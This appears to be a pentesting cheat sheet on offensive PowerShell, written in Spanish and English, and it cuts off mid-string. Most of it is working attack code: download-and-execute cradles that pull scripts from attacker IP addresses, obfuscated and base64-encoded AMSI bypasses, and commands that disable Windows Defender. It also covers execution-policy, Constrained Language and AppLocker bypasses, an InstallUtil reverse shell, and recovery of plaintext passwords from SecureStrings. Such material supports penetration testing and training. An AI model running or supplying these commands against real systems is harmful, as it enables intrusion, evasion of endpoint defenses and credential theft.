# Powershell

PowerShell es una solución de automatización de tareas multiplataforma formada por un shell de línea de comandos, un lenguaje de scripting y un marco de administración de configuración.

## Ubicaciones por defecto de PowerShell <a href="#default-powershell-locations" id="default-powershell-locations"></a>

```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```

### Basic PS commands to startUbicaci <a href="#basic-ps-commands-to-start" id="basic-ps-commands-to-start"></a>

```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```

## Descarga y carga de scritps en memoria <a href="#download--execute" id="download--execute"></a>

{% code overflow="wrap" lineNumbers="true" %}
```powershell
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1'); Invoke-Module some

powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
{% endcode %}

### Download & Execute in background with AMSI Bypass <a href="#download--execute-in-background-with-amsi-bypass" id="download--execute-in-background-with-amsi-bypass"></a>

Primero en crear script y pasarlo a Base 64

{% code overflow="wrap" %}
```bash
cat script.ps1 | iconv --to-code UTF-16LE | base64 -w 0
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
{% endcode %}

#### Using b64 from linux <a href="#using-b64-from-linux" id="using-b64-from-linux"></a>

{% code overflow="wrap" %}
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
{% endcode %}

## Descarga EXEs <a href="#download" id="download"></a>

### System.Net.WebClient <a href="#systemnetwebclient" id="systemnetwebclient"></a>

{% code overflow="wrap" %}
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
{% endcode %}

### Invoke-WebRequest <a href="#invoke-webrequest" id="invoke-webrequest"></a>

{% code overflow="wrap" %}
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
{% endcode %}

### Wget <a href="#wget" id="wget"></a>

{% code overflow="wrap" %}
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
{% endcode %}

### BitsTransfer <a href="#bitstransfer" id="bitstransfer"></a>

{% code overflow="wrap" %}
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
{% endcode %}

## Execution Policy

By default it is set to **restricted.** Main ways to bypass this policy:

{% code overflow="wrap" %}
```powershell
1º Just copy and paste inside the interactive PS console

2º Read en Exec
Get-Content .\script.ps1 | PowerShell.exe -noprofile -

3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression

4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1

5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted

6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process

7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"

8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"

9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
{% endcode %}

{% embed url="https://www.netspi.com/blog/technical-blog/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/" %}

## Constrained language

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **locks down many of the features** needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more.

#### **Check** <a href="#check-2" id="check-2"></a>

```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

#### Bypass <a href="#bypass-1" id="bypass-1"></a>

```powershell
#Easy bypass
Powershell -version 2
```

In current Windows that Bypass won't work but you can use[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**To compile it you may need** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> add `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` and **change the project to .Net4.5**.

**Direct bypass:**

{% code overflow="wrap" %}
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
{% endcode %}

**Reverse shell:**

{% code overflow="wrap" %}
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
{% endcode %}

You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass the constrained mode. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## AppLocker Policy

An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's **application whitelisting solution** and gives system administrators control over **which applications and files users can run**. It provides **granular control** over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers.\
It is common for organizations to **block cmd.exe and PowerShell.exe** and write access to certain directories, **but this can all be bypassed**.

### Check <a href="#check" id="check"></a>

Check which files/extensions are blacklisted/whitelisted:

{% code overflow="wrap" %}
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
{% endcode %}

This registry path contains the configurations and policies applied by AppLocker, providing a way to review the current set of rules enforced on the system:

* `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass <a href="#bypass" id="bypass"></a>

* Useful **Writable folders** to bypass AppLocker Policy: If AppLocker is allowing to execute anything inside `C:\Windows\System32` or `C:\Windows` there are **writable folders** you can use to **bypass this**.

{% code overflow="wrap" %}
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
{% endcode %}

* Commonly **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries can be also useful to bypass AppLocker.
* **Poorly written rules could also be bypassed**
  * For example, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, you can create a **folder called `allowed`** anywhere and it will be allowed.
  * Organizations also often focus on **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable**, but forget about the **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`.
* **DLL enforcement very rarely enabled** due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break. So using **DLLs as backdoors will help bypassing AppLocker**.
* You can use [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) or [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) to **execute Powershell** code in any process and bypass AppLocker. For more info check: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Enable WinRM (Remote PS) <a href="#enable-winrm-remote-ps" id="enable-winrm-remote-ps"></a>

```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
  Where{ $_.NetWorkCategory -ne 'Private'} |
  ForEach {
    $_
    $_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
  }
```

## Desactivar Defender <a href="#disable-defender" id="disable-defender"></a>

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
# Set exclusion path
Set-MpPreference -ExclusionPath (pwd) -disablerealtimemonitoring
Add-MpPreference -ExclusionPath (pwd)

# Check exclusions configured via GPO
Parse-PolFile .\Registry.pol

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
ValueName : Exclusions_Paths
ValueType : REG_DWORD
ValueLength : 4
ValueData : 1

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
ValueName : C:\Windows\Temp
ValueType : REG_SZ
ValueLength : 4
ValueData : 0
```
{% endcode %}

### AMSI bypass <a href="#amsi-bypass" id="amsi-bypass"></a>

**`amsi.dll`** is **loaded** into your process, and has the necessary **exports** for any application interact with. And because it's loaded into the memory space of a process you **control**, you can change its behaviour by **overwriting instructions in memory**. Making it not detect anything.

Therefore, the goal of the AMSI bypasses you will use is to **overwrite the instructions of that DLL in memory to make the detection useless**.

**AMSI bypass generator** web page: [**https://amsi.fail/**](https://amsi.fail/)

{% code overflow="wrap" %}
```powershell
# A Method
[Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils').GetField('am'+'siInitFailed','NonPu'+'blic,Static').SetValue($null,$true)

# Another: from https://github.com/tihanyin/PSSW100AVB/blob/main/AMSI_bypass_2021_09.ps1
$A="5492868772801748688168747280728187173688878280688776828"
$B="1173680867656877679866880867644817687416876797271"
[Ref].Assembly.GetType([string](0..37|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " " ).
GetField([string](38..51|%{[char][int](29+($A+$B).
substring(($_*2),2))})-replace " ",'NonPublic,Static').
SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
&( $SHELLid[1]+$SHELlId[13]+'X') (NeW-OBJEct sYStEm.iO.coMPrESSIOn.defLAtEstReam( [iO.meMorYStReAm] [cOnvErt]::froMBaSE64StRINg( 'rVHRasJAEHzvdwhGkBAhLUXwYU7i2aKFq4mQBh8Sc6bBM5HkYmq/vruQfkF7L3s7s8vM3CXv+nRw0bb6kpm7K7UN71ftjJwk1F/WDapjnZdVcZjPo6qku+aRnW0Ic5JlXd10Y4lcNfVFpK1+8gduHPXiEestcggD6WFTiDfIAFkhPiGP+FDCQkbce1j6UErMsFbIesYD3rtCPhOPDgHtKfENecZe0TzVDNRjsRhP6LCpValN/g/GYzZGxlMlXiF9rh6CGISToZ6Nn3+Fp3+XCwtxY5kIlF++cC6S2WIDEfJ7xEPeuMeQdaftPjUdfVLVGTMd2abTk4cf'), [sysTEm.iO.cOmpResSioN.COMprEssiOnMOde]::decOMPRESs ) | foreAch{NeW-OBJEct iO.STREaMREadER( $_ , [teXt.ENCoDiNg]::aScii )}).REadtoenD( )

# Another Method: from https://github.com/HernanRodriguez1/Bypass-AMSI
${2}=[Ref].Assembly.GetType('Sy'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGUA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQAuAE0A')))+'an'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBnAGUA')))+'m'+'en'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAAuAEEAdQA=')))+'t'+'om'+'at'+'io'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgAuAEEA')))+'ms'+'i'+'U'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABpAGwA')))+'s')
${1}=${2}.GetField('am'+'s'+'iI'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBpAHQA')))+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBhAGkAbAA=')))+'ed','No'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBQAHUA')))+'bl'+'i'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwAsAFMA')))+'ta'+'ti'+'c')
${1}.SetValue($null,$true)

# Another Method
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$field.SetValue($null,$true)

# AMSI Bypass in python
https://fluidattacks.com/blog/amsi-bypass-python/

# Testing for Amsi Bypass:
https://github.com/rasta-mouse/AmsiScanBufferBypass

# Amsi-Bypass-Powershell
https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

https://blog.f-secure.com/hunting-for-amsi-bypasses/
https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
https://github.com/cobbr/PSAmsi/wiki/Conducting-AMSI-Scans
https://slaeryan.github.io/posts/falcon-zero-alpha.html
```
{% endcode %}

### AMSI Bypass 2 - Managed API Call Hooking <a href="#amsi-bypass-2---managed-api-call-hooking" id="amsi-bypass-2---managed-api-call-hooking"></a>

Check [**this post for detailed info and the code**](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/). Introduction:

This new technique relies upon API call hooking of .NET methods. As it turns out, .NET Methods need to get compiled down to native machine instructions in memory which end up looking very similar to native methods. These compiled methods can hooked to change the control flow of a program.

The steps performing API cal hooking of .NET methods are:

1. Identify the target method to hook
2. Define a method with the same function prototype as the target
3. Use reflection to find the methods
4. Ensure each method has been compiled
5. Find the location of each method in memory
6. Overwrite the target method with instructions pointing to our malicious method

### AMSI Bypass 3 - SeDebug Privilege <a href="#amsi-bypass-3---sedebug-privilege" id="amsi-bypass-3---sedebug-privilege"></a>

[**Following this guide & code**](https://github.com/MzHmO/DebugAmsi) you can see how with enough privileges to debug processes, you can spawn a powershell.exe process, debug it, monitor when it loads `amsi.dll` and disable it.

### AMSI Bypass - More Resources <a href="#amsi-bypass---more-resources" id="amsi-bypass---more-resources"></a>

* [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
* [Amsi Bypass on Windows 11 In 2023](https://gustavshen.medium.com/bypass-amsi-on-windows-11-75d231b2cac6) [Github](https://github.com/senzee1984/Amsi_Bypass_In_2023)

## PS-History <a href="#ps-history" id="ps-history"></a>

{% code overflow="wrap" %}
```powershell
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```
{% endcode %}

## Find a newer files <a href="#find-a-newer-files" id="find-a-newer-files"></a>

Options : `CreationTime`, `CreationTimeUtc`, `LastAccessTime`, `LastAccessTimeUtc`, `LastWriteTime`, `LastWriteTimeUtc`

{% code overflow="wrap" %}
```powershell
# LastAccessTime:
(gci C:\ -r | sort -Descending LastAccessTime | select -first 100) | Select-Object -Property LastAccessTime,FullName

# LastWriteTime:
(gci C:\ -r | sort -Descending LastWriteTime | select -first 100) | Select-Object -Property LastWriteTime,FullName
```
{% endcode %}

### Get permissions <a href="#get-permissions" id="get-permissions"></a>

```powershell
Get-Acl -Path "C:\Program Files\Vuln Services" | fl
```

## OS version and HotFixes <a href="#os-version-and-hotfixes" id="os-version-and-hotfixes"></a>

{% code overflow="wrap" %}
```powershell
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
{% endcode %}

## Environment <a href="#environment" id="environment"></a>

```powershell
Get-ChildItem Env: | ft Key,Value -AutoSize #get all values
$env:UserName @Get UserName value
```

## Other connected drives <a href="#other-connected-drives" id="other-connected-drives"></a>

{% code overflow="wrap" %}
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
{% endcode %}

## Recycle Bin <a href="#recycle-bin" id="recycle-bin"></a>

{% code overflow="wrap" %}
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
{% endcode %}

[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## Domain Recon <a href="#domain-recon" id="domain-recon"></a>

PowerView/SharpView

### Users <a href="#users" id="users"></a>

```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```

### Secure String to Plaintext <a href="#secure-string-to-plaintext" id="secure-string-to-plaintext"></a>

```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

Or directly parsing form XML:

```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

### SUDO <a href="#sudo" id="sudo"></a>

```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```

### Groups <a href="#groups" id="groups"></a>

```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```

### Clipboard <a href="#clipboard" id="clipboard"></a>

```powershell
Get-Clipboard
```

### Processes <a href="#processes" id="processes"></a>

```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

### Services <a href="#services" id="services"></a>

```
Get-Service
```

### Password from secure string <a href="#password-from-secure-string" id="password-from-secure-string"></a>

```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```

## Scheduled Tasks <a href="#scheduled-tasks" id="scheduled-tasks"></a>

```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

## [Network](https://book.hacktricks.wiki/en/windows-hardening/basic-powershell-for-pentesters/index.html#network) <a href="#network" id="network"></a>

### Port Scan <a href="#port-scan" id="port-scan"></a>

```powershell
# Check Port or Single IP
Test-NetConnection -Port 80 10.10.10.10

# Check Port List in Single IP
80,443,8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null

# Check Port Range in single IP
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "TCP port $_ is open"} 2>$null

# Check Port List in IP Lists - 80,443,445,8080
"10.10.10.10","10.10.10.11" | % { $a = $_; write-host "[INFO] Testing $_ ..."; 80,443,445,8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect("$a",$_)) "$a : $_ is open!"} 2>$null}

```

### Interfaces <a href="#interfaces" id="interfaces"></a>

```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Firewall <a href="#firewall" id="firewall"></a>

```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```

### Route <a href="#route" id="route"></a>

```powershell
route print
```

### ARP <a href="#arp" id="arp"></a>

```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

### Hosts <a href="#hosts" id="hosts"></a>

```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```

### Ping <a href="#ping" id="ping"></a>

```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```

### SNMP <a href="#snmp" id="snmp"></a>

```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

## **Converting the SDDL String into a Readable Format** <a href="#converting-the-sddl-string-into-a-readable-format" id="converting-the-sddl-string-into-a-readable-format"></a>

{% code overflow="wrap" %}
```powershell
PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e